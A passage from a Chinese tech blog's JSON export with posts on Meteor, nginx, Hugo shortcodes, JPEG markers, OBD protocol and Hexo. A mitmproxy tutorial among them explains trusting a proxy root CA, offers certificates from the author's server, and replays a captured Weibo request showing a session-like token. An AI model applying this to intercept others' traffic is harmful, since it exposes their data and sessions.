看做是 flux 的一种实现，类似 redux 之类的。\nReactivity 可以避免使用很多回调函数。\nComputation\n\n下面是 Meteor 里自带的具有 reactive computation 特性的函数:\n\n    Templates\n    Tracker.autorun\n    Template.autorun\n    Blaze.render Bleze。renderWithData\n\n不过如果使用 React 的话，那就是 mixins: [ReactMeteorData] 这个 mixin 和\ngetMeteorData() 函数一起使用。\n变量\n\n下面介绍几种 Meteor 常用的 reactive 变量。\n\n    MongoDB\n\nMeteor 里用得最多的 reactive 变量来源当然是 Mongodb 的 collections。\n\n    Session\n\nSession是 Meteor 提供的一个只在前端使用的全局 reactive 数据源。\n只要 Session.set 被调用并且改变了原值，那么对应的 Session.get 所在的模板或者 reactive 函数就会被自动重新运行。\n\n例如官方给的这个例子:\n\nTracker.autorun(function () {\n  Meteor.subscribe(\"chat-history\", {room: Session.get(\"currentRoomId\")});\n});\n\n// 下面这条语句会导致上面的 Tracker.autorun 函数再次被执行\n// chat-history 的注册也转移到了 home\nSession.set(\"currentRoomId\", \"home\");\n\n注意 Session.get 和 Session.equals 的文档里有这句 “…, invalidate the computation the next time the variable changes to or from the value.”, 这句话有点让人难以理解。它的意思是这两个 API 会使其所在的 reactive computation 失效，然后自动再运算。其实就是调用了 Session.set 且改变了原值之后，它所对应的 get 和 equals 所在的 reactive computation 函数会被重新运算一次。\n\n还有如果遇到以下情况:\n\n(1) Session.get(\"key\") === value\n(2) Session.equals(\"key\", value)\n\n(2) 比 (1) 要好，可以避免不必要的重新渲染。细节见文档。\n\n但是如果要比较 object 和 array，不能使用 Session.equals。建议使用 underscore 的\n_ .isEqual(Session.get(key), value).\n\n另外如果使用 Session.get(), 它返回的是一个克隆值，所以改变返回值没有任何 reactive 效果。\n\nSession 因为是全局的，支持 hot code push。但是不支持用户 refresh page，如果 refresh，值会回到初始值。\n\n    ReactiveVar/ReactiveDict\n\n这两个未来会合并到后者 ReactiveDict。主要是用于本地变量。\n\n    Meteor.status\n\n不使用回调函数就可以实时获得客户端和服务器端连接的变化。\n\n    Meteor.user / Meteor.userId\n\n如果没有登录的话，值为 null。\n\n    Meteor.loggingIn\n\n获得登录状态变化，用于显示登录动画。\n\n    The ready() method on a subscription handle\n\n类似 subscription 的一个 callback 函数。在ready() 里，Meteor 会自动处理 unsubscription 和回收 subscription 的 handle。所以可以重复 subscribe 同一个数据源而不用自己 unsubscribe,  也避免了重复 subscribe 产生数据冲突。Meteor 还能自动判断已被 unsubscribe 过的数据，如果再次 subscribe 就不会产生 client server 间的重复通信操作。\n高级用法\n\n你也可以使用 Deps 和 Tracker package 创建自己的 reactive 数据源和 computation。不过这里就不介绍了。\nMeteor 的坑:\n\n    目前 NPM 没有官方支持。不过第三方的支持也做得还不错。\n    很多时候必须得按照 Meteor 的方式来编程。如果是老手可能会觉得\u0008掣肘。但是反过来，我认为新手可以学到好的编程模式。\n    大而全的框架更新慢，特别是在前端这个进化快速到几乎变态的环境下。很多新的东西出来不一定马上用得上，不过如果是真的有用，总会有第三方集成支持。\n    数据库只能选 MongoDB。不过有 PostgreSQL 的第三方支持。据说其他数据库支持快了。\n    如果不读文档没有理解 Meteor 的机制会感觉黑魔法有点多。","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Nginx支持apk ipa 文件下载","title":"nginx 支持apk ipa 禁止重命名为zip文件","text":".apk 和 .ipa分别是android应用和ios应用的扩展名。\n\n如果在浏览器下载这些文件为后缀的文件时，会自动重命名为zip文件。\n\n当然可以下载后手动修改后缀，依然可以安装。\n\n如果想下载后缀直接就是apk ipa的，可以修改 /usr/local/nginx/conf目录下的mime.types\n\n增加如下配置，重启nginx生效\n\nApache\napplication/vnd.android.package-archive apk;\napplication/iphone          pxl ipa;\n1\n2\n\napplication/vnd.android.package-archive apk;\napplication/iphone          pxl ipa;","tags":null},{"location":"//blog.pytool.com/hugo/hugo_shortcode","title":"Hugo Shortcode","text":"简介\n\nMarkdown 语法十分简洁，如果想要插入更加复杂的内容就需要直接使用 HTML 代码，比如通过 img 来自定义图片尺寸，通过 iframes 来插入视频。显然这样做，虽然扩展了 Markdown 文档的表达能力，但却牺牲了 Markdown 语法的简洁性，而且插入的 HTML 代码不利于后续对文档的维护和更新。\n\n问题的关键在于，Markdown 的简洁性本身就意味着它难以用来书写复杂的内容，尤其是涉及到展示效果的内容。Hugo 提供了 shortcode 来解决这一问题，既使内容保持了 Markdown 的简洁性，又允许创作者在文档中嵌入一些 Markdown 不支持的形式复杂的内容。\n\n简单来说，shortcode 是一些可以直接插入内容文档中的助记符，在 Hugo 生成网站时，会将这些助记符替换为相应的 HTML 代码片段（严格来说是模板片段）。这样的好处在于，在创作内容时，只要了解这些助记符的用法而不必关心它们是如何实现和转换的。另一方面来看，更新助记符对应的 HTML 片段时，内容文档不会受到影响。接下来将分别介绍：如何在内容文档中使用 shortcode ，Hugo 内置了哪些 shortcode 以及如何自定义 shortcode ？\n\n 用法\n\nShortcode 语法有些类似 HTML 标记，一个完整的 shortcode 包含以下几个部分\n\n{{%/ shorcodename parameters /%}}some content for shortcode template{{%/ /shortcodename /%}}\n\n其中 {{%/ shorcodename parameters /%}} 表示开标记，相应的 {{%/ /shortcodename /%}} 表示闭标记，闭标记是可选的，同样在开闭标记之间的内容也是可选的。\n\n开标记中的参数，最终会被传入 shortcode 模板文件中，影响模板的渲染。参数允许以位置参数或命名参数的形式输入（但不能同时传递这两种参数），参数之间用空格间隔，如果参数本身含有空格则需要为其添加双引号。命名参数的格式为 name=\"value\" 。\n\n除了使用上面的 % 外，还可以使用 ` 来作为 shortcode 的定界符，比如 {{/ gist spf13 7896402 /}}` 。后者跟前者的唯一区别在于，包含在开闭标记之间的内容将不会被 Markdown 引擎处理。\n\n另外，本文中的许多 shortcode 只是用于显示，并不想要被 Hugo 处理，此时需要在 % 或 ` 定界符内侧添加 / 和 /` 。\n\n内置 Shortcode\n\nHugo 预先定义了一些较为常用的 shortcode ，下面介绍如何使用以及在什么情形下使用它们，更详细的用法参见官网\n\n 高亮\n\n用来高亮文档中的代码片段，用法样例：\n\n{{/ highlight python /}}\ndef pt(txt):\n    print(txt)\n{{/ /highlight /}}\n图片\n\n用来扩展 Markdown 中插入图片的语法，该 shortcode 插入的图片支持自定义 CSS 类、添加链接和 caption 等，用法样例：\n\n{{/ figure src=\"/media/spf13.jpg\" title=\"Steve Francia\" link=\"\" caption=\"\" class=\"\" attr=\"\" attrlink=\"\" alt=\"\" /}}\n 文档引用\n\n根据文档在本地文件系统中的路径，来插入文档的超链接，甚至可以引用文档标题位置，用法样例：\n\nNeat\nWho\n\n参数为被引用文档的路径，Hugo 会自动将其替换为被引用文档的永久链接（permalink），ref 和 relref 的不同之处在于，后者给出相对链接，而前者给出完整链接。以上样例的生成结果如下\n\na href=\"/blog/neat\"Neat/a\na href=\"/about/#who:c28654c202e73453784cfd2c5ab356c0\"Who/a\n\nGitHub 代码片段\n\n用来在文档中插入 GitHub 上创建的代码片段，假设代码片段链接为：https://gist.github.com/username/id ，则插入语法如下：\n\n{{/ gist username id /}}\n\n Twitter 推文\n\n用来在内容中插入一条 tweet ，推文的链接是这样的： https://twitter.com/spf13/status/666616452582129664 ，插入这条推文的 shortcode 如下\n\n{{/ tweet 666616452582129664 /}}\nYouTube 视频\n\n用来在内容中插入 YouTube 视频，YouTube 视频资源链接是这样的： https://www.youtube.com/watch?v=w7Ft2ymGmfc ，插入该视频的 shortcode 如下\n\n{{/ youtube w7Ft2ymGmfc /}}\n\n或者开启自动播放\n\n{{/ youtube id=\"w7Ft2ymGmfc\" autoplay=\"true\" /}}\n Vimeo 视频\n\n同插入 YouTube 视频类似，假设资源链接为：https://vimeo.com/channels/staffpicks/146022717 ，则插入语法如下\n\n{{/ vimeo 146022717 /}}\nSpeaker Deck 演示文稿\n\nSpeaker Deck 是一个允许我们共享演示文稿的地方，我们可以将共享在其上的演示文稿插入到内容文档中，在 Speaker Deck 上点击分享后会生成一段 HTML 代码，假设其中的 data-id=\"123456\" ，那么在文档中可以使用如下语法插入该演示文稿\n\n{{/ speakerdeck 123456 /}}\n Instagram 图片\n\n插入 Instagram 上的图片，假设某张图片链接为：https://www.instagram.com/p/BMokmydjG-M/ ，则插入该图片的语法为\n\n{{/ instagram BMokmydjG-M /}}\n\n或\n\n{{/ instagram BMokmydjG-M hidecaption /}}\n自定义 Shortcode\n\n 模板文件位置\n\nshortcode 的工作机制就是将助记符关联的 HTML 模板片段渲染后插入到文档中。Hugo 支持自定义 shortcode ，需要做的十分简单，只要在模板目录 layouts/shortcodes/ 中创建模板文件即可，模板文件名即为 shortcode 的名称（除去文件名中的扩展名）。\n\n同时 Hugo 还支持检索主题资源中的 shortcode，因此 shortcode 的查找顺序如下\n\n/layouts/shortcodes/SHORTCODE.html\n/themes/THEME/layouts/shortcodes/SHORTCODE.html\n\n模板文件内容\n\nshortcode 的模板文件就是普通的 Hugo 模板文件。只不过在 shortcode 模板文件内，可以通过模板变量来访问传入 shortcode 的参数和开闭标记之间的内容。以及其它常规模板变量都可以在 shortcode 模板中访问。\n\n 访问参数\n\n虽然在使用 shortcode 时只可以传入位置和命名参数中的一种，但是在设计 shortcode 模板时却可以考虑接受这两种参数（当然不可能同时接受），为此可以通过模板变量 .IsNamedParams 来判断，当前参数传入是位置的，还是命名的。\n\n在模板文件中，位置参数和命名参数都可以通过模板方法 .Get 来访问：{{ .Get 0 }} 和 {{ .Get \"name\" }} 。或者使用 with 语法来访问 {{ with .Get \"class\"}}class=\"{{.}}\"{{ end }} 。此外还可以通过模板变量 .Params 来访问参数。\n\n访问内容\n\n使用 shortcode 时，位于开闭标记之间的内容，在模板文件中可以通过模板变量 .Inner 来访问。\n\n 访问父模板\n\n此外 shortcode 还支持嵌套，比如在内容文档中像下面这样插入 shortcode\n\n{{/ parentshortcode /}}\n{{/ childshortcode /}}\n{{/ /parentshortcode /}}\n\n然后在模板文件 layouts/shortcodes/childshortcode.html 中可以通过模板变量 .Parent 来访问 parendshortcode.html 的模板环境。\n\n总之 shortcode 模板文件跟普通的模板文件没有差别，基本就是 HTML 代码跟模板变量的混合体，不过 shortcode 模板除了可以访问常规模板变量外，还可以额外访问几个变量和方法：\n\n{{ .Get 0 }}                    获取位置参数\n{{ .Get \"name\" }}               获取命名参数\n{{ with .Get \"class\"}} p class=\"{{.}}\" haha! /p{{ end }}\n.Inner                          位于 shortcode 开闭之间的内容\n.Params                         输入的参数列表\n.IsNamedParams                  判断 shortcode 输入的是位置参数还是命名参数\n.Parent                         shortcode 支持继承，该变量表示父 shortcode\n.Page                           所有的页面变量在 shortcode 都可用\n\n模板样例\n\n年份，模板位置 /layouts/shortcodes/year.html ，内容：\n\n{{ .Page.Now.Year }}\n\n高亮，模板位置 /layouts/shortcodes/highlight.html，内容：\n\n{{ .Get 0 | highlight .Inner  }}\n\n图片，模板位置 /layouts/shortcodes/figure.html，内容：\n\nfigure {{ with .Get \"class\" }}class=\"{{.}}\"{{ end }}\n    {{ with .Get \"link\"}}a href=\"{{.}}\"{{ end }}\n        img src=\"{{ .Get \"src\" }}\" {{ if or (.Get \"alt\") (.Get \"caption\") }}alt=\"{{ with .Get \"alt\"}}{{.}}{{else}}{{ .Get \"caption\" }}{{ end }}\"{{ end }} /\n    {{ if .Get \"link\"}}/a{{ end }}\n    {{ if or (or (.Get \"title\") (.Get \"caption\")) (.Get \"attr\")}}\n    figcaption{{ if isset .Params \"title\" }}\n        h4{{ .Get \"title\" }}/h4{{ end }}\n        {{ if or (.Get \"caption\") (.Get \"attr\")}}p\n        {{ .Get \"caption\" }}\n        {{ with .Get \"attrlink\"}}a href=\"{{.}}\" {{ end }}\n            {{ .Get \"attr\" }}\n        {{ if .Get \"attrlink\"}}/a {{ end }}\n        /p {{ end }}\n    /figcaption\n    {{ end }}\n/figure\n\nYouTube 视频，模板位置 /layouts/shortcodes/youtube.html，内容：\n\ndiv class=\"embed video-player\"\niframe class=\"youtube-player\" type=\"text/html\" width=\"640\" height=\"385\" src=\"http://www.youtube.com/embed/{{ index .Params 0 }}\" allowfullscreen frameborder=\"0\"/iframe\n/div\n`","tags":null},{"location":"//blog.pytool.com/Post/基础/图像处理/2015-12-09 jpg文件格式","title":"jpg文件格式","text":"在JFIF文件格式中，图像样本的存放顺序是从左到右和从上到下。这就是说JFIF文件中的第一个图像样本是图像左上角的样本。\n关键点：\n头标识 0x00: ff d8\n量化表 0x15: ff db\n帧开始 0x100： ff c0 (紧跟其后的3个字节为图像的高度h和宽度w)\n文件结构\nJFIF文件格式直接使用JPEG标准爲应用程式定义的许多标记，因此JFIF格式成了事实上JPEG文件交换格式标准。JPEG的每个标记都是由2个位元组组成，其前一个位元组是固定值0xFF。每个标记之前还可以添加数目不限的0xFF填充位元组(fill byte)。下面是其中的8个标记：\nSOI　 0xD8　　　　　　　　　　　图像开始\nAPP0  0xE0　　　　　　　　　　　JFIF应用资料块\nAPPn  0xE1 - 0xEF　　　      其他的应用资料块(n, 1～15)\nDQT　 0xDB　　　　　　　　　　　量化表\nSOF0  0xC0　　　　　　　　　　　帧开始\nDHT　 0xC4　　　　　　　　　　　霍夫曼(Huffman)表\nSOS　 0xDA　　　　　　　　　　　扫描线开始\nEOI　 0xD9　　　　　　　　　　　图像结束\n爲使读者对JPEG定义的标记一目了然，现将JPEG的标记码列於表6-05，并保留英文解释。\n表6-05 JPEG定义的标记\nSymbol(符号)        Code Assignment(标记代码)        Deforbiddenion(说明)\n\nStart Of Frame markers, non-hierarchical Huffman coding\nSOF0         0xFFC0        Baseline DCT\nSOF1         0xFFC1        Extended sequential DCT\nSOF2         0xFFC2        Progressive DCT\nSOF3         0xFFC3        Spatial (sequential) lossless\nHuffman table specification\nDHT          0xFFC4        Define Huffman table(s)\n\nStart Of Frame markers, hierarchical Huffman coding\nSOF5         0xFFC5        Differential sequential DCT\nSOF6         0xFFC6        Differential progressive DCT\nSOF7         0xFFC7        Differential spatial lossless\n\nStart Of Frame markers, non-hierarchical arithmetic coding\nJPG          0xFFC8        Reserved for JPEG extensions\nSOF9         0xFFC9        Extended sequential DCT\nSOF10        0xFFCA        Progressive DCT\nSOF11        0xFFCB        Spatial (sequential) Lossless\n\narithmetic coding conditioning specification\nDAC          0xFFCC        Define arithmetic conditioning table\n\nStart Of Frame markers, hierarchical arithmetic coding\nSOF13        0xFFCD        Differential sequential DCT\nSOF14        0xFFCE        Differential progressive DCT\nSOF15        0xFFCF        Differential spatial Lossless\n\nRestart interval termination\nRSTm        0xFFD0～0xFFD7        Restart with modulo 8 counter m\nOther marker\nSOI         0xFFD8        Start of image\nEOI         0xFFD9        End of image\nSOS         0xFFDA        Start of scan\nDQT         0xFFDB        Define quantization table(s)\nDNL         0xFFDC        Define number of lines\nDRI         0xFFDD        Define restart interval\nDHP         0xFFDE        Define hierarchical progression\nEXP         0xFFDF        Expand reference image(s)\nAPPn        0xFFE0～0xFFEF        Reserved for application use\nJPGn        0xFFF0～0xFFFD        Reserved for JPEG extension\nCOM         0xFFFE        Comment\nReserved markers\nTEM         0xFF01        For temporary use in arithmetic coding\nRES         0xFF02～0xFFBF        Reserved\n\nJPEG文件由下面的8个部分组成：\n(1) 图像开始SOI(Start of Image)标记 2字节 FF D8\n\n(2) APP0标记(Marker) 2字节 FF E0\n    ① APP0长度(length) 2字节  00 10\n    ② 识别字(identifier) 5字节\n    ③ 版本号(version) 1字节 主 1字节 次\n    ④ X和Y的密度单位(units=0：无单位；units=1：点数/英寸；units=2：点数/厘米) 1字节\n    ⑤ X方向图元密度(X density) 2字节\n    ⑥ Y方向图元密度(Y density) 2字节\n    ⑦ 缩略图水平图元数目(thumbnail horizontal pixels) 1字节\n    ⑧ 缩略图垂直图元数目(thumbnail vertical pixels) 1字节\n    ⑨ 缩略图RGB点阵图(thumbnail RGB bitmap) 3*n 字节\n\n(3) APPn标记(Markers)，其中n=1～15(任选)\n    ① APPn长度(length)\n    ② 由於详细资讯(application specific information)\n\n(4) 一个或者多个量化表DQT(difine quantization table) 2字节 FF DB\n    ① 量化表长度(quantization table length)  2字节 00 84\n    ② 量化表数目(quantization table number)\n    ③ 量化表(quantization table)\n\n(5) 帧图像开始SOF0(Start of Frame) 2字节 FF C0\n    ① 帧开始长度(start of frame length)  2字节 00 11\n    ② 精度(precision)，每个顔色分量每个图元的位元数(bits per pixel per color component) 1字节\n    ③ 图像高度(image height) 2字节\n    ④ 图像宽度(image width) 2字节\n    ⑤ 顔色分量数(number of color components)\n    ⑥ 对每个顔色分量(for each component)\n      o        ID\n      o        垂直方向的样本因数(vertical sample factor)\n      o        水平方向的样本因数(horizontal sample factor)\n      o        量化表号(quantization table#)\n(6) 一个或者多个霍夫曼表DHT(Difine Huffman Table)\n    ① 霍夫曼表的长度(Huffman table length)\n    ② 类型、AC或者DC(Type, AC or DC)\n    ③ 索引(Index)\n    ④ 位表(bits table)\n    ⑤ 值表(value table)\n(7) 扫描开始SOS(Start of Scan)\n    ① 扫描开始长度(start of scan length)\n    ② 顔色分量数(number of color components)\n    ③ 每个顔色分量\n      o        ID\n      o        交流系数表号(AC table #)\n      o        直流系数表号(DC table #)\n    ④ 压缩图像资料(compressed image data)\n(8) 图像结束EOI(End of Image) 2字节 FF D9\n\n表6-06表示了APP0域的详细结构。有兴趣的读者可通过UltraEdit或者PC TOOLS等工具软体打开一个JPG图像文件，对APP0的结构进行分析和验证。\n表6-06 JFIF格式中APP0域的详细结构\n偏移        长度        内容        块的名称        说明\n0        2 byte        0xFFD8        (Start of Image,SOI)        图像开始\n2        2 byte        0xFFE0        APP0(JFIF application segment)        JFIF应用资料块\n4        2 bytes        　        length of APP0 block        APP0块的长度\n6        5 bytes        　        \"JFIF\"+\"0\"        识别APP0标记\n11        1 byte        　                主要版本号(如版本1.02中的1)\n12        1 byte        　                次要版本号(如版本1.02中的02)\n13        1 byte        　         and Y densities  X和Y的密度单位\nunits=0：无单位\nunits=1：点数/英寸\nunits=2：点数/厘米\n14        2 bytes        　                水平方向图元密度\n16        2 bytes        　                垂直方向图元密度\n18        1 byte        　                缩略图水平图元数目\n19        1 byte        　                缩略图垂直图元数目\n　        3n        　         Thumbnail RGB bitmap        缩略RGB点阵图(n爲缩略图的图元数)\n　        　        　        Optional JFIF extension APP0 marker segment(s)        任选的JFIF扩展APP0标记段\n　        ……        　        ……        　\n　        2 byte        0xFFD9        (EOI) end-of-file        图像文件结束标记","tags":null},{"location":"//blog.pytool.com/Post/前端技术/2016-11-09 CSS","title":"css","text":"POSTCSS\nSCSS\nLESS","tags":null},{"location":"//blog.pytool.com/Hacker/02_欺骗嗅探/2016-03-29 mitmproxy","title":"mitmproxy","text":"sudo pip install mitmproxy\n\n安装成功后会在生成两个工具/usr/local/bin/mitmproxy与/usr/local/bin/mitmdump\n\n本人是个开源工具杀手，总会遇到问题\n\n安装问题解决：\n\n如果使用pip安装时，出现pkgresources.DistributionNotFound:(刚升级了os x Mavericks版本就出现了这个问题)，可以先更新pip\n\nsudo easyinstall --upgrade distributesudo easyinstall --upgrade pip\n\n四、CA证书的安装\n\n要捕获https证书，就得解决证书认证的问题，因此需要在通信发生的客户端安装证书，并且设置为受信任的根证书颁布机构。下面介绍6种客户端的安装方法。\n\n当我们初次运行mitmproxy或mitmdump时，\n\n会在当前目录下生成 ~/.mitmproxy文件夹，其中该文件下包含4个文件，这就是我们要的证书了。\nmitmproxy-ca.pem 私钥+证书 文本格式\nmitmproxy-ca-cert.pem Unix平台使用证书(certificate)格式 文本格式\nmitmproxy-ca-cert.cer 与mitmproxy-ca-cert.pem相同，android上使用证书(certificate)格式 文本格式\nmitmproxy-ca-cert.p12 windows上使用证书(certificate)格式 文本格式\nFirefox上安装\n  preferences-Advanced-Encryption-View Certificates-Import (mitmproxy-ca-cert.pem)-trust this CA to identify web sites\n\nchrome上安装\n  设置-高级设置-HTTPS/SSL-管理证书-受信任的根证书颁发机构-导入mitmproxy-ca-cert.pem\n\nosx上安装\n  双击mitmproxy-ca-cert.pem - always trust\n\nwindows7上安装\n  双击mitmproxy-ca-cert.p12-next-next-将所有的证书放入下列存储-受信任的根证书发布机构\nAndroid上安装\n    将mitmproxy-ca-cert.cer 放到sdcard根目录下 选择设置-安全和隐私-从存储设备安装证书\n\niOS上安装\n  将mitmproxy-ca-cert.pem发送到iphone邮箱里，通过浏览器访问/邮件附件\n\n我将证书放在了vps上以供下载\n\nhttp://tanjiti.com/crt/mitmproxy-ca-cert.pem mitmproxy iOS\nhttp://tanjiti.com/crt/mitmproxy-ca-cert.cer mitmproxy android\nhttp://tanjiti.com/crt/mitmproxy-ca-cert.p12 windows\nhttp://tanjiti.com/crt/PortSwigger.cer BurpSuite (burpsuite的证书，随便附上)\n\n6.iOS模拟器上安装\ngit clone https://github.com/ADVTOOLS/ADVTrustStore.gitcd ADVTrustStore/\nDANI-LEE-2:ADVTrustStore danqingdani$ python iosCertTrustManager.py -a ~/iostools/mitmproxy-ca-cert.pem\nsubject= CN = mitmproxy, O = mitmproxyImport certificate to iPhone/iPad simulator v5.1 [y/N] y Importing to /Users/danqingdani/Library/Application Support/iPhone Simulator/5.1/Library/Keychains/TrustStore.sqlite3 Certificate added\n\n实际上上面的操作就是给 ~/Library/Application\\ Support/iPhone\\ Simulator/5.1/Library/Keychains/TrustStore.sqlite3 数据库中表tsettings表中插入证书数据\n\n五、工具使用\n\n在vps上装好了mitmproxy代理，在客户端也装好了CA证书，接下来就可以使用了。\n\n第一步：在vps上启动mitmproxy\n\nmitmproxy -b xxx.xxx.xxx(指定监听的接口) -p xxx(指定端口)\n\n果然我是开源工具杀手，运行时又报错了。\n\n运行错误问题解决：\n\n当运行mitmproxy报错：\nError: mitmproxy requires a UTF console environment.\nSet your LANG enviroment variable to something like enUS.UTF-8\n你可以先运行locale查看当前的语言环境，我的vps就是POSIX环境\nroot@www:/# locale\nLANG=\nLANGUAGE=\nLCCTYPE=\"POSIX\"\nLCNUMERIC=\"POSIX\"\nLCTIME=\"POSIX\"\nLCCOLLATE=\"POSIX\"\nLCMONETARY=\"POSIX\"\nLCMESSAGES=\"POSIX\"\nLCPAPER=\"POSIX\"\nLCNAME=\"POSIX\"\nLCADDRESS=\"POSIX\"\nLCTELEPHONE=\"POSIX\"\nLCMEASUREMENT=\"POSIX\"\nLCIDENTIFICATION=\"POSIX\"\nLCALL=\n\n现在我们需要的是把其修改为enUS.UTF-8\n\n方法参考http://jrs-s.net/2010/11/18/setting-locale-to-utf-8-in-debian/\n\nvim /etc/default/localeLANG=enUS.UTF-8. locale-gen#编辑/etc/profile，与/etc/bash.bashrc,增加 export LANG=enUS.UTF-8echo \"export LANG=enUS.UTF-8\"   /etc/profileecho \"export LANG=enUS.UTF-8\"   /etc/bash.bashrc source /etc/profilesource /etc/bash.bashrc\n\n现在再运行locale，可以看到语言修改过来了\n\nroot@www:/# locale\nLANG=enUS.UTF-8\nLANGUAGE=\nLCCTYPE=\"enUS.UTF-8\"\nLCNUMERIC=\"enUS.UTF-8\"\nLCTIME=\"enUS.UTF-8\"\nLCCOLLATE=\"enUS.UTF-8\"\nLCMONETARY=\"enUS.UTF-8\"\nLCMESSAGES=\"enUS.UTF-8\"\nLCPAPER=\"enUS.UTF-8\"\nLCNAME=\"enUS.UTF-8\"\nLCADDRESS=\"enUS.UTF-8\"\nLCTELEPHONE=\"enUS.UTF-8\"\nLCMEASUREMENT=\"enUS.UTF-8\"\nLCIDENTIFICATION=\"enUS.UTF-8\"\nLCALL=\n\n然后就可以正常的运行了!\n\n第二步：在手机或PC或浏览器上选择使用该http代理\n\n 第三步：使用客户端访问，现在就可以操作通信数据了\n\n六、常见操作\n\nmitmproxy\n\n就介绍最常用到的修改请求，并回放请求的方法吧\n\n(1)方向键定位请求\n(2)当黄色箭头    定位到指定请求时，按回车enter进入请求中\n(3)按e进入编辑状态，然后按对应的蓝色字体来选择修改的部分\n    可以修改query，查询字符串;path，路径;url ;header 请求头;form 表单;raw body 请求正文;method 请求方法。\n(4)a 增加一行，tab键切换编辑字段，回车enter开始编辑，esc保存，q返回上一级\n(5)修改完后，按r就可以重放请求，然后查看修改结果了\n\nmitmdump\n\n别忘了，mitmproxy还有个内向的双胞胎叫mitmdump(很像tcpdump)，它是不交互版的mitmproxy。可以非实时的处理通信包。\n\n我们可以在mitmproxy中按w，将通信数据保存到指定文件中后，然后用mitmdump来操作。接下来简单介绍一个例子，从mitmproxy中捕获到的数据包中，筛选出来自微博的数据包，然后重放这个数据包(其实也可以修改后再重放)\n\n-n 表示不启用代理， -r表示从文件中读取数据包， -w表示将数据包存储到文件中，-c表示重放客户端请求包\n\nmitmdump -nr all.data -w weibo.data \"~u weibo\"\n\nmitmdump -nc weibo.data[replay] POST http://api.weibo.cn/2/client/addlogbatch?s=2edc0cfa7\u0026gsid=4ubed3V0QehBa8KoNp4AA75J\u0026c=android\u0026wm=200050002\u0026ua=Xiaomi-MI+2Sweibo4.0.1androidandroid4.1.1\u0026oldwm=99750001\u0026from=1040195010\u0026skin=default\u0026i=8764056d2\u0026isgzip=\u0026lang=zhCN\u003c\u003c 200 OK 32B\n\nmitmproxy API\n\n开源精神最赞的是，可以像小时候玩积木一样，用大牛们提供的各种精巧工具，搭建自己合适的武器。\nmitmproxy提供了libmproxy以供调用扩展。\n我们可以查看一下libmproxy的详细说明，了解主要的API接口调用\npydoc libmproxy\n官网给了一个自己编写脚本，来操纵数据包的例子，很简单，人人都能看懂\n如下所示，就是在响应包中增加一个自定义头\ndef response(context, flow): flow.response.headers[\"newheader\"] = [\"foo\"]\n我们可以在mitmdump 中使用这个脚本\n-s表示从读取自定义脚本来处理数据包\nmitmdump -ns examples/add_header.py -r infile -w outfile\n\n好了，就介绍到这了。\n\n七、希望交流\n\n我在运行mitmdump重放http响应功能时候\n\nmitmdump -S outfile\n\n卡死了，到目前还没有找到原因，希望知道的大牛告之，万分感谢","tags":null},{"location":"//blog.pytool.com/Hardware/车联网/2017-02-04 ISO9141-2协议解析","title":"ISO9141-2协议解析","text":"ISO-9141-2协议是最常用的通信协议之一，也是属于OBD II标准协议的一种。下面从物理层特性、系统进入、帧结构、命令交互、交互时间参数、常用命令字等几个方面来介绍这种协议。\nØ  物理层特性：空闲电平通常为12V；数据位格式为1+8+1，没有校验位；使用的波特率通常为10416BPS和9600BPS两种。\nØ  系统进入初始化：ISO协议采用地址码进入方式，先使用5BPS发送地址码，ECU响应55H，KW1，KW2，设备对KW2取反发回给ECU，ECU对地址码取反发回给设备，完成系统初始化交互。其中55H这个字节用来规定后面的通信波特率。参见下图：\n       Tool————  —   \u003c—   \u003c—      —     \u003c—   ECU\n\n                 T1 |-|  T2 |-|T3|-|T4|-| T5  |-|  T6 |-|  T7\n\n                                                        图 2-2-1\n其中：           T1 ≥ 300  ms\n               60 ms ≤ T2≤ 300 ms\n5  ms ≤ T3 ≤20 ms\n0  ms ≤ T4 ≤ 20 ms\n25 ms ≤ T5 ≤ 50 ms\n25 ms ≤ T6 ≤ 50 ms\n55 ms ≤ T7 ≤ 5000 ms\n\nØ  帧结构：帧头（3个字节）+数据（最大为7个字节）+校验（通常为校验和）。数据帧有两种：命令帧和响应帧。命令帧由Tools发出，响应帧是ECU对命令帧的响应。帧头结构如下图：\n\n  \t帧头字节1 \t帧头字节2 \t帧头字节3\n  \tPriority/Type \t目标地址 \t源地址\nRequest(Tools-  ECU) \t68H \t6AH \tF1H\nResponse(ECU-  Tools) \t48H \t6BH \t28H\n                     图 2-2-2\n\n数据区包含传送的数据。对于命令帧，DATA区是命令字节及命令参数；对于响应帧，DATA区是命令响应及响应的数据。\n校验是校验字节，为前面字节的累加和，包括帧头和数据区。\n\nØ  命令交互：命令交互通常情况下为1对1，但也存在1对多或者多对1的情况。下面是一组命令交互举例：\nTools: 68H  6AH  F1H  BEH  81H\nECU:   48H  6BH  28H  FEH  31H  32H  33H  40H  42H  43H  34H\n在命令中，目标地址是固定的；ECU响应设备的命令字在设备命令字的基础上+0x40。\nØ  交互时间参数：包括4个时间参数，如下：\n设备发送命令字节间的时间间隔P1，通常为5ms-20ms，取6ms；\nECU返回命令字节间的时间间隔P2，通常为0ms\n设备发送完一帧命令后等待ECU响应的时间P3，为25ms-50ms，一般取30ms；\n设备接收到ECU响应后到发送下一帧命令的时间P4，通常为55ms-5000ms，一般取60ms。\n\nØ  常用命令字：\n系统退出：20H\n读故障码：03H\n清除故障码：14H\n读版本信息：BEH\n读数据流：B1H","tags":null},{"location":"//blog.pytool.com/hugo/Hexo","title":"Hexo使用文档","text":"leanote博客评论设置之Disqus  \nHexo document  \nHexo 中文文档  \n说明:hexo 还是很不错的\nhexo 按更新时间排序 vi config.yml\nindexgenerator:\n  orderby: -update  orderby: Posts order. (Order by date descending by default)\n!-- more --\n 0x01 安装node.js\nnode.js稳定版\nln -s /home/kun/mysofltware/node-v0.10.28-linux-x64/bin/node /usr/local/bin/node\nln -s /home/kun/mysofltware/node-v0.10.28-linux-x64/bin/npm /usr/local/bin/npm\n\n0x02 配置node.js\n通过npm config set   生成 .npmrc\nprefix=D:\\Users\\nodejs\\npm\ncache=D:\\Users\\nodejs\\npm-cache\n\n 0x03 安装 hexo\nnpm install -g hexo\n查看安装结果\nnpm list -g hexo\nUbuntu\nsudo apt-get install nodejs\nsudo ln -s /usr/bin/nodejs /usr/bin/node\nnpm install -g cnpm --registry=https://registry.npm.taobao.org\nsudo npm install cnpm -g\nsudo cnpm install hexo -g\nsudo cnpm install\n\n   \"hexo\": \"^3.2.0\",\n   \"hexo-toc\": \"^0.0.6\",\n   \"hexo-server\": \"^0.2.0\",\n   \"hexo-github\": \"^1.0.1\",\n   \"hexo-deployer-git\": \"^0.1.0\",\n   \"hexo-generator-archive\": \"^0.1.4\",\n   \"hexo-generator-category\": 